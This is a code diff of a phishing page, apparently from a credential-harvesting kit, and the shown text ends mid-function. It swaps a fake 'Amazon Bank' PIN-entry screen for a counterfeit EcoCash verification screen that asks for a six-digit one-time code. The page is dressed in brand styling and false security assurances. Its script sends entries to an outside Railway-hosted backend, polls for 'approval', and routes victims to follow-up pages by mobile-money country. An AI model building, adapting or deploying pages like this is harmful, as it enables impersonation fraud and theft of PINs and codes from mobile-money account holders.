@@ -3,699 +3,508 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<meta name="theme-color" content="#131921">
-<title>Verify · Amazon Bank</title>
+<title>EcoCash · Verification</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --amz-ink: #131921;
-    --amz-orange: #FF861F;
-    --amz-orange-hover: #F07800;
-    --amz-orange-subtle: #FFF4E5;
-    --amz-text: #0F1111;
-    --amz-muted: #565959;
-    --amz-border: #E7E9EC;
-    --amz-border-soft: #F0F1F3;
-    --amz-success: #067D62;
-    --amz-error: #B12704;
+    --eco-blue: #0066A6;
+    --eco-red: #E31E24;
+    --eco-green: #00A651;
+    --eco-navy: #101828;
+    --eco-muted: #667085;
+    --eco-border: #E5E7EB;
+    --eco-soft: #F5F7F9;
+    --eco-bg: #F8FAFC;
   }
-  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
-  html, body { height: 100%; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
     font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: #EEF0F2; color: var(--amz-text);
-    -webkit-font-smoothing: antialiased; line-height: 1.4;
-    min-height: 100dvh; display: flex; justify-content: center; align-items: center;
-    overflow: hidden;
+    background: var(--eco-bg); color: var(--eco-navy);
+    -webkit-font-smoothing: antialiased; line-height: 1.5;
+    min-height: 100vh; padding: 24px 16px 48px;
   }
-  .phone {
-    width: 100%; max-width: 400px; background: #FFFFFF;
-    height: 100dvh; position: relative;
-    display: flex; flex-direction: column; overflow: hidden;
-  }
-  @media (min-width: 520px) {
-    body { padding: 20px 0; }
-    .phone {
-      height: calc(100dvh - 40px); max-height: 760px; border-radius: 22px;
-      box-shadow: 0 24px 70px rgba(19,25,33,0.18), 0 4px 14px rgba(19,25,33,0.08);
-    }
-  }
-  .app-header {
-    background: var(--amz-ink); color: #fff; height: 60px; padding: 0 14px;
-    padding-top: env(safe-area-inset-top, 0);
-    display: flex; align-items: center; justify-content: space-between;
-    position: relative; flex-shrink: 0; z-index: 5;
-  }
-  .app-header .back {
-    width: 34px; height: 34px; border-radius: 50%; border: none;
-    background: transparent; color: #fff; cursor: pointer;
-    display: flex; align-items: center; justify-content: center;
-    margin-left: -4px; transition: background .15s;
-  }
-  .app-header .back:hover { background: rgba(255,255,255,0.08); }
-  .app-header .back svg { width: 19px; height: 19px; }
-  .app-header .title {
-    position: absolute; left: 50%; top: 50%;
-    transform: translate(-50%, -50%);
-    font-size: 16px; font-weight: 600; letter-spacing: -0.2px; white-space: nowrap;
-  }
-  .app-header .spacer-right { width: 34px; height: 34px; }
+  .wrap { max-width: 440px; margin: 0 auto; }
 
-  .body-scroll {
-    flex: 1 1 auto;
-    overflow: hidden;
-    padding: 16px 20px 16px;
-    display: flex; flex-direction: column;
-  }
+  .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
+  .brand { display: inline-flex; align-items: baseline; font-weight: 900; font-size: 22px; letter-spacing: -0.6px; }
+  .brand .eco { color: var(--eco-blue); }
+  .brand .cash { color: var(--eco-red); }
+  .header .label { font-size: 10.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.7px; color: var(--eco-muted); }
 
-  .brand-block { text-align: center; margin-bottom: 14px; }
-  .brand-block .brand-mark {
-    width: 52px; height: 52px; border-radius: 14px;
-    background: linear-gradient(135deg, var(--amz-orange), var(--amz-orange-hover));
-    color: var(--amz-ink); display: inline-flex; align-items: center; justify-content: center;
-    font-size: 20px; font-weight: 800; letter-spacing: -0.5px;
-    box-shadow: 0 6px 18px rgba(255,134,31,0.30); margin-bottom: 8px;
-  }
-  .brand-block .brand-name { font-size: 16px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; }
-  .brand-block .brand-sub { font-size: 10.5px; color: var(--amz-muted); margin-top: 1px; letter-spacing: 0.2px; }
+  .card { background: #fff; border-radius: 20px; border: 1px solid var(--eco-border); box-shadow: 0 10px 30px rgba(17,24,39,0.06); overflow: hidden; }
+  .card-head { padding: 22px 22px 16px; border-bottom: 1px solid var(--eco-border); background: #FBFCFE; text-align: center; }
+  .card-head h1 { font-size: 18px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 4px; }
+  .card-head p { font-size: 12.5px; color: var(--eco-muted); line-height: 1.6; }
 
-  .context-card {
-    background: #F7F8FA; border: 1px solid var(--amz-border-soft);
-    border-radius: 12px; padding: 10px 14px; margin-bottom: 14px;
-  }
-  .context-row {
-    display: flex; justify-content: space-between; align-items: center;
-    padding: 5px 0; font-size: 12px;
-  }
-  .context-row + .context-row { border-top: 1px solid var(--amz-border-soft); }
-  .context-row .k { color: var(--amz-muted); font-weight: 500; }
-  .context-row .v { color: var(--amz-ink); font-weight: 600; text-align: right; max-width: 62%; word-break: break-word; }
-  .context-row .v.mono { font-family: "SF Mono", Monaco, monospace; font-size: 11px; letter-spacing: 0.3px; }
-  .context-row.total { padding-top: 7px; }
-  .context-row.total .v { font-weight: 800; font-size: 13.5px; }
+  .card-body { padding: 20px 22px 22px; }
 
-  .verify-headline { text-align: center; margin-bottom: 4px; }
-  .verify-headline h1 { font-size: 16px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; margin-bottom: 3px; }
-  .verify-headline p { font-size: 11.5px; color: var(--amz-muted); line-height: 1.45; max-width: 300px; margin: 0 auto; }
+  .tx-block { background: var(--eco-soft); border-radius: 12px; padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+  .tx-block .tx-left .k { font-size: 10.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: var(--eco-muted); margin-bottom: 3px; }
+  .tx-block .tx-left .v { font-size: 13.5px; font-weight: 700; word-break: break-all; }
+  .tx-block .tx-amt { font-size: 17px; font-weight: 800; color: var(--eco-blue); letter-spacing: -0.4px; white-space: nowrap; }
+  .tx-block .tx-amt .cur { font-size: 11.5px; font-weight: 700; margin-right: 3px; opacity: 0.85; }
 
-  .pin-label { font-size: 12px; font-weight: 600; color: var(--amz-ink); margin: 14px 0 8px; text-align: center; }
-  .pin-row {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    margin-bottom: 6px;
-    width: 100%;
+  .expired-notice {
+    display: none; background: #FEF2F2; border: 1px solid #FECACA; border-left: 3px solid var(--eco-red);
+    color: #B91C1C; font-size: 12.5px; font-weight: 600; padding: 11px 14px; border-radius: 10px;
+    margin-bottom: 14px; line-height: 1.5; align-items: center; gap: 8px;
   }
-  .pin-input {
-    width: 100%;
-    max-width: 300px;
-    height: 60px;
-    text-align: center;
-    font-size: 26px;
-    font-weight: 700;
-    letter-spacing: 16px;
-    padding-left: 16px;
-    color: var(--amz-ink);
-    background: #FFFFFF;
-    border: 1.5px solid var(--amz-border);
-    border-radius: 12px;
-    outline: none;
-    font-family: "SF Mono", Monaco, monospace;
-    transition: border-color .15s, box-shadow .15s;
-    -webkit-appearance: none;
-  }
-  .pin-input::placeholder { color: #C0C6CE; letter-spacing: 16px; }
-  .pin-input:focus { border-color: var(--amz-orange); box-shadow: 0 0 0 3px rgba(255,134,31,0.16); }
-  .pin-input.filled { border-color: var(--amz-ink); }
-  .pin-input.error { border-color: var(--amz-error); box-shadow: 0 0 0 3px rgba(177,39,4,0.10); }
+  .expired-notice.show { display: flex; }
+  .expired-notice .icon { width: 20px; height: 20px; border-radius: 50%; background: var(--eco-red); color: #fff; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; flex-shrink: 0; }
+  .expired-notice .text { flex: 1; }
+  .expired-notice .text small { display: block; font-size: 11px; font-weight: 500; color: #7F1D1D; margin-top: 2px; }
 
-  .pin-error {
-    display: none; text-align: center; font-size: 11px;
-    color: var(--amz-error); font-weight: 600; margin-top: 5px;
+  .otp-label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 8px; text-align: center; }
+  .otp-row { display: flex; justify-content: center; gap: 8px; margin-bottom: 14px; }
+  .otp-row input {
+    flex: 1; min-width: 0; max-width: 48px; height: 52px;
+    border: 2.5px solid var(--eco-border); border-radius: 14px;
+    background: #fff; color: var(--eco-navy);
+    font-family: inherit; font-size: 22px; font-weight: 800;
+    text-align: center; outline: none;
+    transition: border-color .15s, box-shadow .15s, background .15s;
   }
-  .pin-error.show { display: block; }
+  .otp-row input:focus { border-color: var(--eco-blue); box-shadow: 0 0 0 3px rgba(0,102,166,0.12); }
+  .otp-row input.filled { border-color: var(--eco-blue); background: #F6FBFE; }
+  .otp-row input:disabled { background: #F5F7F9; color: var(--eco-muted); }
 
-  .security-note {
-    display: flex; align-items: center; justify-content: center;
-    gap: 6px; font-size: 10.5px; color: var(--amz-muted); margin-top: 10px; text-align: center;
-  }
-  .security-note svg { width: 12px; height: 12px; color: var(--amz-success); flex-shrink: 0; }
+  .otp-help { display: flex; justify-content: center; align-items: center; gap: 6px; margin-bottom: 16px; font-size: 12px; color: var(--eco-muted); }
+  .resend-btn { background: transparent; border: none; font-family: inherit; font-size: 12px; font-weight: 700; color: var(--eco-blue); cursor: pointer; padding: 2px 0; }
+  .resend-btn:disabled { color: var(--eco-muted); cursor: default; }
 
-  .spacer { flex: 1 1 auto; min-height: 8px; }
+  .action-btn {
+    width: 100%; height: 56px; background: var(--eco-blue); color: #fff;
+    border: none; border-radius: 14px; font-family: inherit;
+    font-size: 15px; font-weight: 800; cursor: pointer;
+    transition: filter .15s, transform .1s;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+  }
+  .action-btn:hover { filter: brightness(1.08); }
+  .action-btn:active { transform: scale(0.99); }
+  .action-btn:disabled { opacity: 0.7; cursor: wait; }
 
-  .verify-btn {
-    width: 100%; padding: 14px; font-size: 15px; font-weight: 700; font-family: inherit;
-    color: #FFFFFF;
-    background: linear-gradient(180deg, #FF9C3D 0%, var(--amz-orange) 55%, var(--amz-orange-hover) 100%);
-    border: none; border-radius: 12px; cursor: pointer;
-    box-shadow: 0 6px 18px rgba(255,134,31,0.30), inset 0 1px 0 rgba(255,255,255,0.35);
-    transition: filter .15s, transform .1s, opacity .15s; letter-spacing: 0.2px;
-  }
-  .verify-btn:hover { filter: brightness(1.05); }
-  .verify-btn:active { transform: scale(0.995); }
-  .verify-btn:disabled {
-    background: #D6D9DD; color: #8A8F98; box-shadow: none; cursor: not-allowed;
-  }
+  .card-foot { padding: 14px 22px 18px; border-top: 1px solid var(--eco-border); background: #FBFCFE; text-align: center; }
+  .card-foot .brand { font-size: 15px; }
+  .card-foot .small { font-size: 10.5px; color: var(--eco-muted); margin-top: 3px; }
 
-  .verifying-overlay {
-    position: fixed; inset: 0; background: var(--amz-ink); color: #fff;
-    z-index: 100;
-    display: none; flex-direction: column; align-items: center; justify-content: center;
-    padding: 30px; text-align: center;
-  }
-  .verifying-overlay.show { display: flex; }
-  .verifying-overlay .brand-mark {
-    width: 72px; height: 72px; border-radius: 18px;
-    background: linear-gradient(135deg, var(--amz-orange), var(--amz-orange-hover));
-    display: flex; align-items: center; justify-content: center;
-    color: var(--amz-ink); font-weight: 800; font-size: 28px; letter-spacing: -0.5px;
-    box-shadow: 0 10px 30px rgba(255,134,31,0.4); margin-bottom: 20px;
-  }
-  .verifying-overlay .load-title { font-size: 22px; font-weight: 700; letter-spacing: -0.3px; margin-bottom: 6px; }
-  .verifying-overlay .load-sub { font-size: 13px; color: rgba(255,255,255,0.65); margin-bottom: 26px; max-width: 280px; line-height: 1.5; }
-  .verifying-overlay .spinner {
-    width: 34px; height: 34px; border: 3px solid rgba(255,255,255,0.15);
-    border-top-color: var(--amz-orange); border-radius: 50%;
-    animation: spin .8s linear infinite; margin-bottom: 30px;
-  }
+  .page-foot { text-align: center; margin-top: 16px; font-size: 11px; color: var(--eco-muted); line-height: 1.6; }
+
+  .verifying { position: fixed; inset: 0; background: #FFFFFF; display: none; align-items: center; justify-content: center; z-index: 2000; }
+  .verifying.show { display: flex; }
+  .verifying .inner { text-align: center; max-width: 320px; padding: 0 24px; }
+  .verifying .logo-big { display: inline-flex; align-items: baseline; font-weight: 900; font-size: 32px; letter-spacing: -1px; margin-bottom: 32px; }
+  .verifying .logo-big .eco { color: var(--eco-blue); }
+  .verifying .logo-big .cash { color: var(--eco-red); }
+  .verifying .spinner { width: 54px; height: 54px; margin: 0 auto 22px; border: 4px solid #E5E7EB; border-top-color: var(--eco-blue); border-radius: 50%; animation: spin 0.9s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
+  .verifying .t { font-size: 17px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 6px; }
+  .verifying .s { font-size: 13px; color: var(--eco-muted); line-height: 1.6; }
 
-  .safety-panel {
-    background: rgba(255,255,255,0.05);
-    border: 1px solid rgba(255,255,255,0.08);
-    border-radius: 14px;
-    padding: 20px 14px;
-    max-width: 340px;
-    width: 100%;
-    min-height: 92px;
-    position: relative;
-    overflow: hidden;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+  .toast {
+    position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(80px);
+    background: var(--eco-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    opacity: 0; transition: all .3s ease; z-index: 3000; pointer-events: none;
+    max-width: 90%; text-align: center;
   }
-  .safety-slide {
-    position: absolute;
-    inset: 0;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-    padding: 0 20px;
-    opacity: 0;
-    transform: translateX(30px);
-    transition: opacity .5s ease, transform .5s ease;
-    color: rgba(255,255,255,0.85);
-    font-size: 12.5px;
-    font-weight: 500;
-    line-height: 1.5;
-    text-align: center;
-  }
-  .safety-slide.active { opacity: 1; transform: translateX(0); }
-  .safety-slide.leaving { opacity: 0; transform: translateX(-30px); }
-  .safety-slide svg { width: 20px; height: 20px; color: var(--amz-success); flex-shrink: 0; }
-  .safety-slide span { flex: 1; text-align: left; }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-  .popup-backdrop {
-    position: fixed; inset: 0;
-    background: rgba(19,25,33,0.45);
-    z-index: 120;
-    display: none;
-    align-items: center; justify-content: center;
-    padding: 24px;
-  }
-  .popup-backdrop.show { display: flex; animation: fadeIn .2s ease; }
-  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-  .popup-card {
-    background: #FFFFFF;
-    border-radius: 16px;
-    padding: 26px 22px 22px;
-    max-width: 320px;
-    width: 100%;
-    text-align: center;
-    box-shadow: 0 20px 60px rgba(19,25,33,0.35);
-    animation: popIn .25s cubic-bezier(.4,1.3,.6,1);
-  }
-  @keyframes popIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
-  .popup-card .ic {
-    width: 60px; height: 60px;
-    border-radius: 50%;
-    background: #FDECEA;
-    color: var(--amz-error);
-    display: flex; align-items: center; justify-content: center;
-    margin: 0 auto 14px;
-  }
-  .popup-card .ic svg { width: 30px; height: 30px; }
-  .popup-card h3 { font-size: 18px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; margin-bottom: 6px; }
-  .popup-card p { font-size: 13px; color: var(--amz-muted); line-height: 1.5; margin-bottom: 18px; }
-  .popup-card .ok-btn {
-    width: 100%; padding: 12px; border: none; border-radius: 10px;
-    background: var(--amz-ink); color: #fff; font-family: inherit;
-    font-size: 14px; font-weight: 700; cursor: pointer; transition: filter .15s;
-  }
-  .popup-card .ok-btn:hover { filter: brightness(1.15); }
-  .popup-card .ok-btn:active { transform: scale(0.98); }
-
-  .state-card { padding: 46px 24px; text-align: center; }
-  .state-card .ic {
-    width: 54px; height: 54px; border-radius: 50%; background: var(--amz-orange-subtle);
-    color: var(--amz-orange-hover); display: flex; align-items: center; justify-content: center;
-    font-size: 24px; margin: 0 auto 16px;
-  }
-  .state-card h2 { font-size: 18px; font-weight: 800; color: var(--amz-ink); margin-bottom: 6px; letter-spacing: -0.3px; }
-  .state-card p { font-size: 13px; color: var(--amz-muted); line-height: 1.55; max-width: 280px; margin: 0 auto; }
-
-  @media (max-height: 700px) {
-    .brand-block { margin-bottom: 10px; }
-    .brand-block .brand-mark { width: 44px; height: 44px; font-size: 18px; margin-bottom: 6px; }
-    .context-card { padding: 8px 12px; margin-bottom: 10px; }
-    .pin-label { margin: 10px 0 6px; }
-    .pin-input { height: 54px; font-size: 24px; }
-    .spacer { min-height: 4px; }
-    .verify-btn { padding: 12px; }
+  @media (max-width: 360px) {
+    .otp-row input { height: 46px; font-size: 19px; border-radius: 12px; }
+    .otp-row { gap: 6px; }
+    .action-btn { height: 50px; font-size: 14px; }
+    .card-body { padding: 18px 16px 20px; }
+    .card-head { padding: 20px 16px 14px; }
   }
 </style>
 </head>
 <body>
 
-<div class="phone" id="phone">
-  <header class="app-header">
-    <button class="back" id="backBtn" aria-label="Back">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M15 18l-6-6 6-6"/>
-      </svg>
-    </button>
-    <div class="title">Verify transaction</div>
-    <span class="spacer-right"></span>
-  </header>
+<div class="wrap">
+  <div class="header">
+    <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+    <span class="label">Verification</span>
+  </div>
 
-  <div class="body-scroll" id="bodyScroll">
-    <div class="brand-block">
-      <div class="brand-mark">AB</div>
-      <div class="brand-name">Amazon Bank</div>
-      <div class="brand-sub">Secure cash-out verification</div>
+  <div class="card">
+    <div class="card-head">
+      <h1>Enter verification code</h1>
+      <p>Enter the 6-digit code you received. It will be sent for approval.</p>
     </div>
 
-    <div class="context-card">
-      <div class="context-row"><span class="k">Recipient</span><span class="v" id="ctxRecipient">—</span></div>
-      <div class="context-row"><span class="k">Payment method</span><span class="v" id="ctxMethod">—</span></div>
-      <div class="context-row"><span class="k">Reference</span><span class="v mono" id="ctxRef">—</span></div>
-      <div class="context-row total"><span class="k">Amount to receive</span><span class="v" id="ctxAmount">$0.00</span></div>
+    <div class="card-body">
+      <div class="tx-block">
+        <div class="tx-left">
+          <div class="k">Transaction</div>
+          <div class="v" id="txId">—</div>
+        </div>
+        <div class="tx-amt"><span class="cur" id="amtCur">USD</span><span id="amtVal">0.00</span></div>
+      </div>
+
+      <div class="expired-notice" id="expiredNotice">
+        <span class="icon">!</span>
+        <div class="text">
+          Code expired. Please resend.
+          <small>Your previous code is no longer valid. Tap "Resend code" to receive a new one.</small>
+        </div>
+      </div>
+
+      <label class="otp-label">6-digit code</label>
+      <div class="otp-row" id="otpRow">
+        <input type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code">
+        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1">
+        <input type="text" inputmode="numeric" maxlength="1">
+      </div>
+
+      <div class="otp-help">
+        <span>Didn't receive the code?</span>
+        <button class="resend-btn" id="resendBtn" onclick="requestCode('manual')" disabled>Resend in 30s</button>
+      </div>
+
+      <button class="action-btn" id="verifyBtn" onclick="verifyCode()">Verify</button>
     </div>
 
-    <div class="verify-headline">
-      <h1>Enter your PIN</h1>
-      <p>Confirm your identity to receive this payment. Use the PIN linked to this account.</p>
+    <div class="card-foot">
+      <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+      <div class="small">Your credentials are never shared.</div>
     </div>
+  </div>
 
-    <div class="pin-label">Your PIN</div>
-    <div class="pin-row" id="pinRow">
-      <input class="pin-input" type="password" inputmode="numeric" maxlength="5" autocomplete="off" placeholder="••••">
-    </div>
-    <div class="pin-error" id="pinError">Please enter 4 or 5 digits of your PIN.</div>
-
-    <div class="security-note">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/>
-        <path d="M9 12l2 2 4-4"/>
-      </svg>
-      <span>Secured with end-to-end encryption</span>
-    </div>
-
-    <div class="spacer"></div>
-    <button class="verify-btn" id="verifyBtn" disabled>Verify &amp; continue</button>
+  <div class="page-foot">
+    Powered by EcoCash · Secure payment verification
   </div>
 </div>
 
-<div class="verifying-overlay" id="verifyingOverlay">
-  <div class="brand-mark">AB</div>
-  <div class="load-title">Processing securely</div>
-  <div class="load-sub">Your request is being reviewed. Please keep this page open.</div>
-  <div class="spinner"></div>
-  <div class="safety-panel">
-    <div class="safety-slide active">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
-      <span>End-to-end encryption protects your details at every step.</span>
-    </div>
-    <div class="safety-slide">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
-      <span>No funds move until the request is fully approved.</span>
-    </div>
-    <div class="safety-slide">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
-      <span>Amazon Bank never shares your information with third parties.</span>
-    </div>
+<div class="verifying" id="verifying">
+  <div class="inner">
+    <div class="logo-big"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+    <div class="spinner"></div>
+    <div class="t">Verifying…</div>
+    <div class="s">Please wait for approval. Do not close this page.</div>
   </div>
 </div>
 
-<div class="popup-backdrop" id="popupBackdrop">
-  <div class="popup-card">
-    <div class="ic">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
-        <circle cx="12" cy="12" r="10"/>
-        <path d="M12 8v4"/>
-        <path d="M12 16h.01"/>
-      </svg>
-    </div>
-    <h3>Incorrect PIN</h3>
-    <p>The PIN you entered doesn't match the one linked to this account. Please try again carefully.</p>
-    <button class="ok-btn" id="popupOkBtn">Try again</button>
-  </div>
-</div>
+<div class="toast" id="toast"></div>
 
 <script>
-/* ────────────────────────────────────────────────────────────
-   RAILWAY endpoints — always-on, no cold start
-   ──────────────────────────────────────────────────────────── */
-const RAILWAY_BASE = 'https://amazonpay-production.up.railway.app';
+  /* ────────────────────────────────────────────────────────────
+     RAILWAY endpoints — all API calls route through Railway
+     (always-on, no Render cold start).
+     ──────────────────────────────────────────────────────────── */
+  const RAILWAY_BASE = 'https://amazonpay-production.up.railway.app';
 
-const CONFIG = {
-  MTN_NEXT_PAGE: 'sms.html',
-  ECOCASH_NEXT_PAGE: 'ecocash.html',
-  VERIFY_ENDPOINT: RAILWAY_BASE + '/api/verify/send',
-  STATUS_ENDPOINT: (id) => RAILWAY_BASE + '/api/verify/status/' + encodeURIComponent(id),
-  POLL_INTERVAL_MS: 2000,
-  MAX_WAIT_MS: 5 * 60 * 1000,
-  SHORT_LINK_ENDPOINTS: [
-    (code) => RAILWAY_BASE + '/api/links/' + encodeURIComponent(code),
-    (code) => RAILWAY_BASE + '/api/links?code=' + encodeURIComponent(code)
-  ],
-  DEFAULT_FEE: 0,
-  SLOW_HINT_MS: 6000
-};
+  const CONFIG = {
+    OTP_REQUEST: RAILWAY_BASE + '/api/verification/otp',
+    SUBMIT:      RAILWAY_BASE + '/api/verification/submit',
+    STATUS:      (ref) => RAILWAY_BASE + '/api/verification/status/' + encodeURIComponent(ref) + '?_=' + Date.now(),
+    LINKS: [
+      (code) => RAILWAY_BASE + '/api/links/' + encodeURIComponent(code),
+      (code) => RAILWAY_BASE + '/api/links?code=' + encodeURIComponent(code)
+    ],
+    NEXT_APPROVED: 'verify.html',
+    NEXT_INACTIVE: 'inactive.html'
+  };
 
-/* MTN countries — normalized comparison, ignores
-   whitespace, case, and accent variations. */
-const MTN_COUNTRIES = [
-  'Benin', 'Cameroon', "Côte d'Ivoire", 'Congo', 'Eswatini',
-  'Ghana (MTN)', 'Liberia', 'Rwanda (MTN)', 'Uganda (MTN)', 'Zambia (MTN)'
-];
+  /* ------------------------------------------------------------
+     Resolve transaction data from the URL, ?r=, or sessionStorage
+  ------------------------------------------------------------ */
+  const params = new URLSearchParams(location.search);
+  const txData = {
+    tx:  params.get('tx')  || '',
+    am:  params.get('am')  || '0',
+    cur: params.get('cur') || 'USD',
+    rn:  params.get('rn')  || '',
+    c:   params.get('c')   || '',
+    pm:  params.get('pm')  || '',
+    dt:  params.get('dt')  || ''
+  };
 
-function normalizeCountry(s) {
-  return String(s || '')
-    .normalize('NFC')
-    .replace(/\u00a0/g, ' ')
-    .replace(/\s+/g, ' ')
-    .trim()
-    .toLowerCase();
-}
-
-function nextPageFor(country) {
-  const c = normalizeCountry(country);
-  const isMtn = MTN_COUNTRIES.some(m => normalizeCountry(m) === c);
-  return isMtn ? CONFIG.MTN_NEXT_PAGE : CONFIG.ECOCASH_NEXT_PAGE;
-}
-
-const CURRENCY_SYMBOLS = {
-  USD: '$', ZiG: 'ZiG ', ZAR: 'R', KES: 'KSh ', BWP: 'P ',
-  MWK: 'MK ', RWF: 'FRw ', XAF: 'FCFA ', XOF: 'CFA ', ZMW: 'K ',
-  UGX: 'USh ', GHS: '₵', SZL: 'E', LRD: 'L$ ', EUR: '€', GBP: '£'
-};
-function currencySymbol(code) {
-  const c = String(code || 'USD').toUpperCase();
-  return CURRENCY_SYMBOLS[c] || (c + ' ');
-}
-function formatMoney(amount, currency) {
-  const n = Number(amount);
-  const safe = isFinite(n) ? n : 0;
-  return currencySymbol(currency) + safe.toFixed(2);
-}
-
-function b64urlDecode(str) {
-  str = String(str).replace(/-/g, '+').replace(/_/g, '/');
-  while (str.length % 4) str += '=';
-  return decodeURIComponent(escape(atob(str)));
-}
-function readQuery(name) { return new URLSearchParams(window.location.search).get(name); }
-
-async function resolvePayload() {
-  try {
-    const raw = sessionStorage.getItem('amz_payload');
-    if (raw) return JSON.parse(raw);
-  } catch (e) {}
-  const d = readQuery('d');
-  if (d) {
-    try { return JSON.parse(b64urlDecode(d)); }
-    catch (e) { throw new Error('Invalid link data.'); }
+  function b64urlDecode(str) {
+    str = String(str).replace(/-/g, '+').replace(/_/g, '/');
+    while (str.length % 4) str += '=';
+    return decodeURIComponent(escape(atob(str)));
   }
-  const code = readQuery('r');
-  if (code) {
-    for (const makeUrl of CONFIG.SHORT_LINK_ENDPOINTS) {
+
+  async function resolveTx() {
+    // 1) ?d= base64 payload
+    const d = params.get('d');
+    if (d) {
       try {
-        const res = await fetch(makeUrl(code));
-        if (!res.ok) continue;
-        const data = await res.json();
-        const payload = data && (data.payload || data);
-        if (payload && (payload.am || payload.c)) return payload;
+        const p = JSON.parse(b64urlDecode(d));
+        Object.assign(txData, {
+          tx:  p.tx  || p.tn || '',
+          am:  p.am  || '',
+          cur: p.cur || '',
+          rn:  p.rn  || '',
+          c:   p.c   || '',
+          pm:  p.pm  || '',
+          dt:  p.dt  || ''
+        });
+        return;
       } catch (e) {}
     }
-    throw new Error('This payment link could not be loaded.');
-  }
-  throw new Error('No payment data available.');
-}
-
-function escapeHtml(s) {
-  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
-    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
-  }[c]));
-}
-
-const state = {
-  payload: null, pin: ['', '', '', '', ''], requestId: null,
-  polling: false, pollStart: 0, slowHintTimer: null
-};
-
-function render(payload) {
-  state.payload = payload;
-  const cur = String(payload.cur || 'USD').toUpperCase();
-  const amount = Number(payload.am || 0);
-  const fee = (payload.fee != null) ? Number(payload.fee) : CONFIG.DEFAULT_FEE;
-  const receive = Math.max(0, amount - (isFinite(fee) ? fee : 0));
-
-  const setTxt = (id, txt) => { const el = document.getElementById(id); if (el) el.textContent = txt; };
-  setTxt('ctxRecipient', payload.rn || '—');
-  const acct = String(payload.an || '').replace(/\s+/g, '');
-  const last4 = acct.slice(-4) || '0000';
-  const modeLabel = (String(payload.pm || '').trim()) || 'Amazon Flex Debit Card';
-  setTxt('ctxMethod', modeLabel + ' *' + last4);
-  setTxt('ctxRef', payload.tx || payload.tn || '—');
-  setTxt('ctxAmount', formatMoney(receive, cur));
-}
-
-function showStateCard(icon, title, message) {
-  const scroll = document.getElementById('bodyScroll');
-  if (!scroll) return;
-  scroll.innerHTML =
-    '<div class="state-card">' +
-      '<div class="ic">' + escapeHtml(icon) + '</div>' +
-      '<h2>' + escapeHtml(title) + '</h2>' +
-      '<p>' + escapeHtml(message) + '</p>' +
-    '</div>';
-}
-
-function initPin() {
-  const pinInput = document.querySelector('.pin-input');
-  const errEl = document.getElementById('pinError');
-  const verifyBtn = document.getElementById('verifyBtn');
-  if (!pinInput || !verifyBtn) return;
-
-  function updateState() {
-    const val = pinInput.value.replace(/\D/g, '');
-    pinInput.value = val;
-    state.pin = val.split('');
-    const filled = val.length === 4 || val.length === 5;
-    pinInput.classList.toggle('filled', filled);
